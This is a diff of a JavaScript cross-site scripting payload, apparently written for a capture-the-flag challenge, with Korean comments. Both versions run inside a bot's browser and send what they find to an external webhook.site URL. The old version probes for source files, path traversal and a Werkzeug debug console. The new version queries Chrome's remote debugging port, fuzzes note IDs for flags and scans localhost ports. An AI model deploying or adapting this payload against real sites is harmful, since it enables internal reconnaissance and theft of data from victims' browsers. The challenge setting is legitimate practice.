@@ -1,73 +1,71 @@
 (async () => {
-    const WEBHOOK = 'https://webhook.site/144fdef3-ea07-4316-bff4-7619115f30f3';
+    const WEBHOOK = 'https://webhook.site/144fdef3-ea07-4316-bff4-7619115f30f3'; // 본인의 주소
 
-    // 1. 소스 코드 파일 직접 접근 시도
-    // Flask가 정적 파일 규칙을 잘못 설정했거나, 루트에 파일이 노출된 경우 확인
-    const filesToFetch = [
-        '/bot.py',
-        '/app.py',
-        '/Dockerfile',
-        '/static/../bot.py', // 상위 디렉토리 탐색(Traversal) 시도
-        '/__pycache__/bot.cpython-311.pyc' // 컴파일된 파이썬 파일
-    ];
-
-    let fileResults = {};
-    for (const path of filesToFetch) {
-        try {
-            const res = await fetch(path);
-            if (res.status === 200) {
-                fileResults[path] = await res.text();
-            } else {
-                fileResults[path] = `Status ${res.status}`;
-            }
-        } catch (e) {
-            fileResults[path] = "Error";
-        }
-    }
-
-    // 2. Werkzeug Debugger Console 확인
-    // 디버거가 열려있다면 HTML에 "__debugger__" 같은 문자열이 포함됨
-    let consoleResult = "Failed";
+    // 1. [핵심] Chrome Remote Debugging Port (9222) 확인
+    let debuggerInfo = "Closed";
     try {
-        const res = await fetch('/console');
+        const res = await fetch('http://127.0.0.1:9222/json');
         if (res.status === 200) {
-            const text = await res.text();
-            // 내용이 너무 길 수 있으므로 특정 키워드나 앞부분만 자름
-            consoleResult = text.includes('Werkzeug') ? "Active! (Werkzeug Found)" : "Inactive";
-            // 만약 Active라면 전체 HTML을 훔쳐야 함 (이번엔 생략하고 상태만 확인)
-        } else {
-            consoleResult = `Status ${res.status}`;
+            debuggerInfo = await res.text(); // 여기에 다른 탭 정보가 JSON으로 뜸
         }
-    } catch (e) {
-        consoleResult = e.toString();
+    } catch (e) { debuggerInfo = "Connection Failed (Port 9222)"; }
+
+    // 2. Referrer 확인 (봇이 어디서 왔는가)
+    const referrer = document.referrer;
+
+    // 3. 특수 노트 ID 찍어보기 (Fuzzing)
+    const specialIds = ['0', '1', 'admin', 'flag', 'secret', 'test', 'note', 'private'];
+    let foundSpecialNotes = {};
+    for (const id of specialIds) {
+        try {
+            const res = await fetch(`/note/${id}`);
+            if (res.status === 200) {
+                foundSpecialNotes[id] = "FOUND! Check content manually if possible.";
+                // 내용도 살짝 긁어오기
+                const text = await res.text();
+                if (text.includes("uoftctf")) foundSpecialNotes[id] += " [FLAG FOUND]";
+            }
+        } catch(e) {}
     }
 
-    // 3. 강제 에러 유발 (Traceback 확인)
-    // 존재하지 않는 템플릿이나 잘못된 입력을 보내 500 에러 유도
-    // (이 앱은 404를 잘 처리하므로, 로직 에러를 찾아야 함. 
-    //  예: POST 데이터 없이 /note/new 호출 등은 200 OK라서 어려움)
-    // 여기선 단순히 이상한 경로 호출로 Flask 디폴트 에러 페이지 확인
-    let errorPageResult = "";
-    try {
-        // Flask는 보통 리소스가 없으면 404지만, 
-        // URL 길이 제한 초과 등을 이용해 서버 에러를 유발할 수도 있음.
-        // 일단은 404 페이지에 디버그 정보가 있는지 확인
-        const res = await fetch('/this_page_does_not_exist_xyz');
-        errorPageResult = await res.text();
-    } catch(e) {}
+    // 4. [재시도] 더 넓은 범위의 포트 스캔 + 타임아웃 증가 (3초)
+    // 9222(Chrome), 9000(PhpFpm), 8080(Proxy), 3000(React/Node), 5001(Flask Alt)
+    const ports = [9222, 8080, 8000, 3000, 5001, 8888, 80]; 
+    let portScan = {};
+    for (const port of ports) {
+        try {
+            const controller = new AbortController();
+            const timeout = setTimeout(() => controller.abort(), 2000); // 2초 대기
+            // no-cors로 찔러보기
+            await fetch(`http://127.0.0.1:${port}/`, { mode: 'no-cors', signal: controller.signal });
+            clearTimeout(timeout);
+            portScan[port] = "OPEN";
+            
+            // OPEN이면 내용 읽기 시도
+            try {
+                const r = await fetch(`http://127.0.0.1:${port}/`);
+                portScan[port + "_body"] = (await r.text()).substring(0, 200);
+            } catch(err) { portScan[port + "_body"] = "CORS Blocked"; }
 
-    // 데이터 전송
+        } catch(e) { /* Closed */ }
+    }
+
+    // 5. history 개수 (봇이 이전에 다른 곳을 들렀는지)
+    const historyLen = window.history.length;
+
     const data = {
-        msg: "Server Leak Probe",
-        files: fileResults,
-        debuggerStatus: consoleResult,
-        errorPageSample: errorPageResult.substring(0, 500), // 앞부분만 확인
+        msg: "Last Resort Scan",
+        chromeDebugger: debuggerInfo, // 9222 포트 결과 (가장 중요)
+        referrer: referrer,           // 어디서 왔니
+        specialNotes: foundSpecialNotes, // admin, flag 노트가 있니
+        portScan: portScan,           // 포트 재확인
+        historyLength: historyLen,
         location: window.location.href
     };
 
     fetch(WEBHOOK, {
         method: 'POST',
-        mode: 'no-cors', // CORS 무시하고 보냄
+        mode: 'no-cors',
         body: JSON.stringify(data)
     });
 })();
